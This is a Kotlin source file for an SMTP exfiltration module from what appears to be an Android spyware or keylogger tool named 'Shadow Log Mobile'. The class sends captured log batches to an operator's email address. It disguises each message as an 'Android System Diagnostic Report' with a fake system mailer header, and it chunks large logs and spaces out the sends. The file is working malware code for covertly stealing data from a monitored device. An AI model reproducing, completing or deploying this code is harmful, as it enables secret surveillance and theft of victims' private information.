package com.system.service.exfil

import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Properties
import jakarta.mail.Authenticator
import jakarta.mail.Message
import jakarta.mail.PasswordAuthentication
import jakarta.mail.Session
import jakarta.mail.Transport
import jakarta.mail.internet.InternetAddress
import jakarta.mail.internet.MimeMessage

/**
 * SMTP email exfiltration channel.
 * Sends log batches as camouflaged system diagnostic emails.
 * Mirrors the desktop's smtpExfil.
 */
class SMTPExfil(
    private val host: String,
    private val port: Int,
    private val user: String,
    private val pass: String,
    private val to: String
) {

    fun isEnabled(): Boolean = host.isNotBlank() && user.isNotBlank() && pass.isNotBlank() && to.isNotBlank()

    /** Send a log batch via email. */
    fun send(content: String): Boolean {
        if (!isEnabled()) return false

        return try {
            val chunks = splitForEmail(content, 50000)
            for ((i, chunk) in chunks.withIndex()) {
                val subject = "Android System Diagnostic Report #${i + 1} - ${
                    SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(Date())
                }"
                sendEmail(subject, chunk)
                if (chunks.size > 1) Thread.sleep(3000)
            }
            true
        } catch (_: Exception) {
            false
        }
    }

    /** Send a test email. */
    fun sendTest(): Boolean {
        return try {
            sendEmail(
                "System Service Connectivity Test",
                "Shadow Log Mobile - SMTP channel operational.\nTimestamp: ${Date()}"
            )
            true
        } catch (_: Exception) {
            false
        }
    }

    private fun sendEmail(subject: String, body: String) {
        val props = Properties().apply {
            put("mail.smtp.auth", "true")
            put("mail.smtp.host", host)
            put("mail.smtp.port", port.toString())

            if (port == 465) {
                put("mail.smtp.ssl.enable", "true")
                put("mail.smtp.socketFactory.port", "465")
                put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory")
            } else {
                put("mail.smtp.starttls.enable", "true")
                put("mail.smtp.starttls.required", "true")
            }

            put("mail.smtp.connectiontimeout", "10000")
            put("mail.smtp.timeout", "10000")
            put("mail.smtp.writetimeout", "10000")
        }

        val session = Session.getInstance(props, object : Authenticator() {
            override fun getPasswordAuthentication(): PasswordAuthentication {
                return PasswordAuthentication(user, pass)
            }
        })

        val message = MimeMessage(session).apply {
            setFrom(InternetAddress(user))
            setRecipient(Message.RecipientType.TO, InternetAddress(to))
            setSubject(subject)
            setText(body, "UTF-8")
            setHeader("X-Mailer", "Android System Service")
        }

        Transport.send(message)
    }

    private fun splitForEmail(s: String, maxLen: Int): List<String> {
        if (s.length <= maxLen) return listOf(s)
        val chunks = mutableListOf<String>()
        var remaining = s
        while (remaining.isNotEmpty()) {
            if (remaining.length <= maxLen) {
                chunks.add(remaining)
                break
            }
            var idx = remaining.lastIndexOf('\n', maxLen)
            if (idx <= 0) idx = maxLen
            chunks.add(remaining.substring(0, idx))
            remaining = remaining.substring(idx).trimStart('\n')
        }
        return chunks
    }
}
